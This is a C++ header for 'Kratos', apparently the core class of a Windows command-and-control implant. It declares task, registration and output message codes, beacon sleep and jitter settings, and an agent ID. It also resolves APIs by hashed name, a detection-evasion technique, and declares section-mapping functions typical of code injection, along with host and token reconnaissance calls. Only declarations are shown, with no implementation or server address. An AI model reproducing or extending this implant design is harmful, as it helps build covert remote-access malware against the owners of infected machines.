#pragma once
#include <windows.h>

#ifdef DEBUG
#include <stdio.h>
#include <wchar.h>
#endif

#include "nt.h"
#include "../api/api.h"
#include "utils/utils.h"


#ifdef DEBUG
#define DEBUG_LOG(msg, ...)  printf(msg "\n", ##__VA_ARGS__)
#define DEBUG_LOGW(msg, ...)  wprintf(msg L"\n", ##__VA_ARGS__)
#else
#define DEBUG_LOG(msg, ...)  
#define DEBUG_LOGW(msg, ...) 
#endif


#define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
#define ALLOC_ARGS LMEM_FIXED | LMEM_ZEROINIT
#define MSG_GETTASK  0x1
#define MSG_REGISTER 0x2
#define MSG_OUTPUT   0x3


#define RESP_NO_TASKS 0xa1


#define DECL( x ) decltype( x ) * x

#define HASH_STRA( x ) api::HasherA( ( x ) )
#define HASH_STRW( x ) api::HasherW( ( x ) )

class Kratos {
public:
	struct Apis {

		// advapi
		DECL(GetUserNameW);
		DECL(GetComputerNameExW);


		// k32
		DECL(LoadLibraryA);
		DECL(GetProcAddress);
		DECL(CloseHandle);
		DECL(LocalReAlloc);
		DECL(LocalAlloc);
		DECL(LocalFree);
		DECL(GetUserDefaultGeoName);
		DECL(GetTickCount);
		DECL(CreateFileA);


		// ntdll
		DECL(RtlRandomEx);
		DECL(NtOpenProcessToken);
		DECL(NtQueryInformationToken);
		DECL(NtQueryInformationProcess);
		DECL(NtCreateSection);
		DECL(NtMapViewOfSection);
	};

	struct Dlls {
		HMODULE kernel32;
		HMODULE ntdll;
		HMODULE Advapi32;
	};

	struct Settings {
		INT32 Sleep;
		INT32 Jitter;
		BOOL IsConnected;
		INT64 LoadedModules;
	};

	Settings settings;
	Apis   apis;
	Dlls dlls;
	INT32 AgentID;
	BOOL Register();
	BOOL LoadConfig();
	BOOL Init();
	BOOL LoadApis();
	BOOL Run();
};

extern Kratos* kratos;